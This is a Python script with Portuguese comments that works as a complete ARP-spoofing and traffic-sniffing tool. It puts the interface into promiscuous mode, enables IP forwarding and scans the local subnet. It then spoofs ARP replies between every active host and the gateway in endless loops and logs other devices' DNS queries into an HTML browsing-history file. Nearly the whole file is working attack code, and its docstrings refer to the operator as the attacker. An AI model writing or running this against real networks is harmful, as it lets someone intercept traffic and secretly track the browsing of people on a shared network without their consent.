import os
import socket
import struct
import threading
from queue import Queue
from time import sleep, strftime
from datetime import datetime
import fcntl
import array
import queue
import time
import subprocess

# Função para habilitar o encaminhamento de pacotes
def enable_ip_forwarding():
    """
    Habilita o IP Forwarding no Linux.
    """
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)


def get_network_info():
    """
    Detecta a interface de rede ativa, IP e máscara de sub-rede.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    max_interfaces = 32
    bytes_needed = max_interfaces * 32
    names = array.array('B', b'\0' * bytes_needed)
    outbytes = struct.unpack('iL', fcntl.ioctl(
        sock.fileno(), 0x8912,  # SIOCGIFCONF
        struct.pack('iL', bytes_needed, names.buffer_info()[0])))[0]
    namestr = names.tobytes()
    interfaces = []

    for i in range(0, outbytes, 40):
        name = namestr[i:i + 16].split(b'\0', 1)[0]
        ip = namestr[i + 20:i + 24]
        try:
            ip_str = socket.inet_ntoa(ip)
            if ip_str.startswith("127."):
                continue
            interfaces.append((name.decode('utf-8'), ip_str))
        except:
            continue

    if interfaces:
        # Seleciona a primeira interface válida
        interface_name = interfaces[0][0]
        ip_address = interfaces[0][1]
        # Obtém a máscara de sub-rede
        netmask = socket.inet_ntoa(fcntl.ioctl(
            sock.fileno(), 0x891b,  # SIOCGIFNETMASK
            struct.pack('256s', interface_name[:15].encode('utf-8')))[20:24])
        return interface_name, ip_address, netmask
    else:
        raise Exception("Não foi possível encontrar uma interface de rede válida.")
    
def discover_hosts(local_ip, active_hosts, history_file, thread_count=50):
    """Realiza a varredura de IPs ativos na sub-rede."""
    subnet = ".".join(local_ip.split(".")[:3])  # Determina a sub-rede (ex.: 192.168.1)
    print(f"[*] Iniciando varredura na sub-rede: {subnet}.0/24")
    ip_queue = Queue()
    for i in range(1, 255):
        ip_queue.put(f"{subnet}.{i}")
    
    def worker():
        """Thread para verificar se hosts estão ativos."""
        while not ip_queue.empty():
            ip = ip_queue.get()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.settimeout(1)
                packet_id = threading.current_thread().ident & 0xFFFF
                icmp_packet = create_icmp_packet(packet_id)
                start_time = time.time()
                sock.sendto(icmp_packet, (ip, 1))
                response, _ = sock.recvfrom(1024)
                response_time = (time.time() - start_time) * 1000  # Tempo em milissegundos
                if parse_icmp_reply(response, packet_id):
                    with threading.Lock():
                        if ip not in active_hosts:
                            active_hosts.append((ip, response_time))
                            log_to_history(history_file, ip)
                            print(f"[+] Host ativo: {ip} - Tempo de resposta: {response_time:.2f} ms")
            except socket.timeout:
                pass
            except Exception as e:
                print(f"[Erro] {e}")
            finally:
                ip_queue.task_done()
    
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)
    ip_queue.join()
    for t in threads:
        t.join()
    print("[*] Varredura concluída.")
    print("[*] IPs ativos encontrados:", [ip for ip, _ in active_hosts])
    
# Função para calcular IPs dentro da sub-rede
def calculate_subnet_hosts(ip_address, netmask):
    """
    Calcula os endereços IPs na sub-rede de acordo com o IP e a máscara.
    """
    ip_binary = struct.unpack('!I', socket.inet_aton(ip_address))[0]
    netmask_binary = struct.unpack('!I', socket.inet_aton(netmask))[0]
    network_binary = ip_binary & netmask_binary
    broadcast_binary = network_binary | ~netmask_binary & 0xFFFFFFFF

    # Gera todos os endereços IP entre o endereço de rede e o broadcast
    return [
        socket.inet_ntoa(struct.pack('!I', ip))
        for ip in range(network_binary + 1, broadcast_binary)
    ]

# Função para obter o endereço do gateway padrão
def get_default_gateway():
    """
    Obtém o gateway padrão do sistema.
    """
    with open('/proc/net/route') as f:
        for line in f.readlines():
            parts = line.strip().split()
            if parts[1] == '00000000':
                return socket.inet_ntoa(struct.pack('<L', int(parts[2], 16)))
    return None

# Função para identificar IPs ativos usando ICMP
def ping_worker(ip_queue, active_hosts, lock):
    """
    Thread para verificar IPs ativos na rede.
    """
    while not ip_queue.empty():
        ip = ip_queue.get()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(1)
            packet_id = threading.current_thread().ident & 0xFFFF
            icmp_packet = create_icmp_packet(packet_id)
            start_time = time.time()
            sock.sendto(icmp_packet, (ip, 1))
            response, _ = sock.recvfrom(1024)
            response_time = (time.time() - start_time) * 1000  # Tempo em milissegundos
            if parse_icmp_reply(response, packet_id):
                with lock:
                    active_hosts.append((ip, response_time))
                    print(f"[+] Host ativo: {ip} - Tempo de resposta: {response_time:.2f} ms")
        except socket.timeout:
            pass
        except Exception as e:
            print(f"[Erro] {e}")
        finally:
            ip_queue.task_done()

# Função para criar pacotes ICMP Echo Request
def create_icmp_packet(packet_id):
    """
    Cria um pacote ICMP Echo Request.
    """
    header = struct.pack('bbHHh', 8, 0, 0, packet_id, 1)  # Tipo 8 (Echo Request)
    data = struct.pack('d', time.time())
    checksum = calculate_checksum(header + data)
    header = struct.pack('bbHHh', 8, 0, checksum, packet_id, 1)
    return header + data

# Função para calcular checksum
def calculate_checksum(data):
    """
    Calcula o checksum de pacotes ICMP.
    """
    checksum = 0
    count_to = (len(data) // 2) * 2
    for count in range(0, count_to, 2):
        checksum += (data[count + 1] << 8) + data[count]
    if count_to < len(data):
        checksum += data[-1]
    checksum = (checksum >> 16) + (checksum & 0xFFFF)
    checksum += (checksum >> 16)
    return ~checksum & 0xFFFF

# Função para verificar a resposta do ICMP
def parse_icmp_reply(packet, packet_id):
    """
    Verifica se a resposta ICMP corresponde ao ID do pacote enviado.
    """
    icmp_header = packet[20:28]
    type, _, _, recv_id, _ = struct.unpack('bbHHh', icmp_header)
    return type == 0 and recv_id == packet_id  # Tipo 0 (Echo Reply)

# Função para registrar o IP no histórico
def log_to_history(file_path, ip):
    """Registra o IP encontrado no arquivo de histórico."""
    with open(file_path, "a") as history_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        history_file.write(f"{timestamp} - IP encontrado: {ip}\n")
        print(f"[+] Registrado no histórico: {ip}")

def create_arp_packet(target_ip, target_mac, sender_ip, sender_mac):
    """
    Cria um pacote ARP para spoofing.
    """
    # Converter endereços MAC para bytes, se necessário
    if isinstance(target_mac, str):
        target_mac = bytes.fromhex(target_mac.replace(":", ""))
    if isinstance(sender_mac, str):
        sender_mac = bytes.fromhex(sender_mac.replace(":", ""))

    ether_header = struct.pack("!6s6sH", target_mac, sender_mac, 0x0806)  # Ethernet II + ARP
    arp_header = struct.pack(
        "!HHBBH6s4s6s4s",
        1,               # Hardware type (Ethernet)
        0x0800,          # Protocol type (IPv4)
        6,               # Hardware size
        4,               # Protocol size
        2,               # Opcode (reply)
        sender_mac,      # Sender MAC address
        socket.inet_aton(sender_ip),  # Sender IP address
        target_mac,      # Target MAC address
        socket.inet_aton(target_ip),  # Target IP address
    )
    return ether_header + arp_header

def get_mac(ip, interface):
    """
    Obtém o MAC address associado a um IP usando a tabela ARP do sistema.
    """
    try:
        result = subprocess.check_output(["arp", "-n", ip], text=True)
        mac = result.splitlines()[-1].split()[2]
        if mac and mac != "(incomplete)":
            # Verifica o formato do MAC
            if not all(c in "0123456789abcdefABCDEF:" for c in mac):
                raise ValueError(f"MAC inválido: {mac}")
            return mac
    except Exception as e:
        print(f"Erro ao obter o MAC do IP {ip}: {e}")
    raise Exception(f"MAC não encontrado para o IP {ip}")

def get_active_macs(interface):
    """
    Obtém uma lista de IPs e MACs ativos na rede usando a tabela ARP.
    """
    try:
        result = subprocess.check_output(["arp", "-n"], text=True).splitlines()
        active_hosts = {}
        for line in result[1:]:  # Ignora a primeira linha (cabeçalhos)
            parts = line.split()
            if len(parts) >= 4 and parts[2] != "(incomplete)":
                ip = parts[0]
                mac = parts[2]
                active_hosts[ip] = mac
        return active_hosts
    except Exception as e:
        print(f"[Erro] Falha ao obter dispositivos ativos: {e}")
        return {}

# Função para enviar ARP Spoofing
def arp_spoof(target_ip, gateway_ip, interface):
    """
    Envia pacotes ARP para enganar o host e o roteador.
    """
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)
    attacker_mac = get_attacker_mac(interface)

    target_packet = create_arp_packet(target_ip, target_mac, gateway_ip, attacker_mac)
    gateway_packet = create_arp_packet(gateway_ip, gateway_mac, target_ip, attacker_mac)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))

    while True:
        sock.send(target_packet)
        sock.send(gateway_packet)
        time.sleep(2)

def set_promiscuous_mode(interface, enable=True):
    """
    Ativa ou desativa o modo promíscuo na interface de rede de forma segura.
    """
    # Abrir um socket para manipular a interface
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifr = struct.pack('16sH', interface.encode('utf-8'), 0)  # Estrutura básica de ifreq
    flags = struct.unpack('16sH', fcntl.ioctl(sock, 0x8913, ifr))[1]  # SIOCGIFFLAGS

    if enable:
        print(f"[*] Ativando modo promíscuo na interface {interface}")
        flags |= 0x100  # Ativar o IFF_PROMISC (modo promíscuo)
    else:
        print(f"[*] Desativando modo promíscuo na interface {interface}")
        flags &= ~0x100  # Desativar o IFF_PROMISC (modo promíscuo)

    # Aplicar as alterações
    ifr = struct.pack('16sH', interface.encode('utf-8'), flags)
    fcntl.ioctl(sock, 0x8914, ifr)  # SIOCSIFFLAGS

    # Verificar se a operação foi bem-sucedida
    new_flags = struct.unpack('16sH', fcntl.ioctl(sock, 0x8913, ifr))[1]
    if enable and (new_flags & 0x100):
        print(f"[+] Modo promíscuo ativado com sucesso na interface {interface}")
    elif not enable and not (new_flags & 0x100):
        print(f"[+] Modo promíscuo desativado com sucesso na interface {interface}")
    else:
        print(f"[!] Falha ao alterar o modo promíscuo na interface {interface}")

    sock.close()

def capture_traffic(interface, output_file, valid_macs):
    """
    Captura apenas pacotes DNS de dispositivos na rede, excluindo o IP local,
    e registra os domínios como URLs clicáveis.
    """
    # Cache para evitar duplicação de registros
    dns_cache = set()

    # Determinar o IP local (ignorar este IP na captura)
    local_ip = get_network_info()[1]

    # Atualizar a tabela ARP periodicamente para capturar novos dispositivos
    def update_arp_cache():
        while True:
            new_macs = get_active_macs(interface)
            valid_macs.update(new_macs)
            print(f"[INFO] Tabela ARP atualizada: {new_macs}")
            time.sleep(30)  # Atualiza a cada 30 segundos

    # Iniciar thread para atualizar a tabela ARP
    arp_update_thread = threading.Thread(target=update_arp_cache, daemon=True)
    arp_update_thread.start()

    # Configurar socket para captura de pacotes
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    sock.bind((interface, 0))  # Vincula o socket à interface fornecida

    with open(output_file, "w") as f:
        f.write("<html><header><title>Histórico de Navegação</title></header><body><ul>\n")
        try:
            while True:
                packet = sock.recv(65535)
                eth_header = packet[:14]

                # Identificar o protocolo Ethernet
                eth_proto = struct.unpack("!H", eth_header[12:14])[0]

                # Continuar apenas se for IPv4
                if eth_proto != 0x0800:  # IPv4
                    continue

                # Extrair cabeçalho IP
                ip_header = packet[14:34]
                ip_proto = struct.unpack("!B", ip_header[9:10])[0]
                src_ip = socket.inet_ntoa(ip_header[12:16])

                # Ignorar o tráfego da máquina local
                if src_ip == local_ip:
                    continue

                # Captura de pacotes DNS
                if ip_proto == 17:  # UDP
                    udp_header = packet[34:42]
                    src_port, dest_port = struct.unpack("!HH", udp_header[:4])
                    if dest_port == 53:  # DNS
                        dns_data = packet[42:]
                        domain = extract_dns_query(dns_data)
                        if domain and domain not in dns_cache:
                            dns_cache.add(domain)
                            timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

                            # Formatar o domínio como URL
                            if domain.startswith("www."):
                                url = f"http://{domain}"
                            else:
                                url = f"http://{domain}"

                            # Registrar no arquivo HTML
                            f.write(f"<li>{timestamp} - {src_ip} -> DNS Query: <a href=\"{url}\">{domain}</a></li>\n")
                            print(f"[+] {timestamp} - {src_ip} -> DNS Query: {domain}")
                            f.flush()
        except KeyboardInterrupt:
            print("\n[INFO] Captura interrompida pelo usuário.")
        f.write("</ul></body></html>\n")

def extract_dns_query(dns_data):
    """
    Extrai o domínio de uma consulta DNS, lidando com bytes inválidos.
    """
    try:
        domain_parts = []
        i = 12  # DNS payload começa após o cabeçalho de 12 bytes
        while True:
            length = dns_data[i]
            if length == 0:  # Final do nome
                break
            domain_parts.append(dns_data[i + 1:i + 1 + length].decode('latin-1'))  # 'latin-1' para lidar com bytes inválidos
            i += length + 1
        return '.'.join(domain_parts)
    except Exception as e:
        print(f"[Erro] Não foi possível extrair a consulta DNS: {e}")
        return None



# Função para obter o MAC do atacante
def get_attacker_mac(interface):
    """
    Obtém o MAC do próprio atacante na interface especificada.
    """
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))
    return sock.getsockname()[4]

def update_valid_macs(interface, valid_macs):
    new_macs = get_active_macs(interface)
    valid_macs.update(new_macs)
    print(f"[INFO] Tabela ARP atualizada. Novos dispositivos: {new_macs}")


def main():
    try:
        print("[*] Iniciando a aplicação...")

        # Detectar informações de rede
        print("[*] Detectando informações de rede...")
        interface, ip_address, netmask = get_network_info()
        print(f"    - Interface ativa: {interface}")
        print(f"    - Endereço IP: {ip_address}")
        print(f"    - Máscara de sub-rede: {netmask}")

        # Ativar modo promíscuo
        set_promiscuous_mode(interface, enable=True)

        # Obter o gateway padrão
        gateway_ip = get_default_gateway()
        if not gateway_ip:
            raise Exception("Não foi possível encontrar o gateway padrão.")
        print(f"    - Gateway padrão: {gateway_ip}")

        # Habilitar IP Forwarding
        print("[*] Habilitando IP Forwarding...")
        enable_ip_forwarding()

        # Obter dispositivos ativos
        print("[*] Obtendo dispositivos ativos na rede...")
        active_hosts = get_active_macs(interface)
        print(f"    - Dispositivos ativos encontrados:")
        for ip, mac in active_hosts.items():
            print(f"      * {ip} -> {mac}")

        # Atualização periódica de ARP
        def periodic_update():
            while True:
                update_valid_macs(interface, active_hosts)
                time.sleep(30)  # Atualiza a cada 30 segundos

        update_thread = threading.Thread(target=periodic_update)
        update_thread.daemon = True
        update_thread.start()

        # Verificar se há hosts ativos antes de continuar
        if not active_hosts:
            print("[!] Nenhum dispositivo ativo encontrado. Finalizando a aplicação.")
            return

        # Iniciar ARP Spoofing (caso existam hosts ativos)
        print("[*] Iniciando ARP Spoofing...")
        spoof_threads = []
        for ip in active_hosts.keys():
            t = threading.Thread(target=arp_spoof, args=(ip, gateway_ip, interface))
            spoof_threads.append(t)
            t.start()
        print("[*] ARP Spoofing iniciado com sucesso!")

        # Captura de tráfego
        print("[*] Capturando tráfego de rede...")
        capture_file = "historico.html"
        capture_traffic(interface, capture_file, active_hosts)  # Passando os MACs válidos
        print(f"[+] Captura de tráfego salva em: {capture_file}")

    except KeyboardInterrupt:
        print("\n[INFO] Execução interrompida pelo usuário.")
    except Exception as e:
        print(f"[Erro] {e}")
    finally:
        # Desativar modo promíscuo ao final da execução
        set_promiscuous_mode(interface, enable=False)
        print("[*] Finalizando a aplicação...")

if __name__ == "__main__":
    main()
